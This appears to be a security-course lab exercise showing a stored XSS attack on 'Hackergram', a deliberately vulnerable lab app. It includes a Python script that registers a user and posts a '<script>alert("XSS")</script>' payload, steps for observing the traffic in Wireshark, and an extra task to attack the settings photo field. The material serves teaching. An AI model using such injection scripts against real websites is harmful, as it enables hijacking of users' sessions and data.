# Stored XSS

In this attack, the attacker writes a post that contains JavaScript code (which gets stored in Hackergram's database). When users see the post the victim-browser executes the code. The procedure is the following:

1.	Create a file with the following Python script at the attacker:

``` py
import requests
import sys

def reset(session):
    session.get(SERVER+"/reset")

def register(session):
    payload = {
        'username': "mallory",
        'name': "Mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/signup", data=payload)

def login(session):
    payload = {
        'username': "mallory",
        'password': "eve123"
    }
    session.post(SERVER+"/login", data=payload)

def exploit(session):
    payload = {
        'content': "<script>alert(\"XSS\")</script>",
    }
    r = session.post(SERVER+"/create_post", data=payload)
    print(r)

if __name__ == '__main__':
    host = '192.168.0.100' if len(sys.argv) < 2 else sys.argv[1]
    port = '80' if len(sys.argv) < 3 else sys.argv[2]
    SERVER = "http://" + host + ":" + port
    print(SERVER)
    with requests.session() as s:
        reset(s)
        register(s)
        login(s)
        exploit(s)
```
        
The script first makes a request to the ```/reset``` endpoint to force a clean state on Hackergram and then registers and logs in the ```@mallory``` user. Lastly, it makes a request to the ```/create_post``` endpoint, creating a new post with the content: ```<script>alert("XSS")</script>```. This post is going to be stored in Hackergram's database.

2.	Install a Wireshark probe at the Hackergram interface.
3.	Run the script at the attacker.
4.	Login to Hackergram (e.g., as ```mr_robot```) and check that the victim-browser runs the JavaScript code when visiting either Mallory's profile page or Hackergram's homepage. In this case, a pop-up box with the message ```XSS``` must be displayed.
5.	Analyze the traffic exchanged by Hackergram using an ```http``` filter. Identify the HTTP message that injects the JavaScript code in Hackergram and the one that transfers it to the victim-browser.

!!! note "Additional exercise"

    The "/settings" endpoint is also vulnerable to this attack type. Find a way of using the photo field to attack this endpoint. 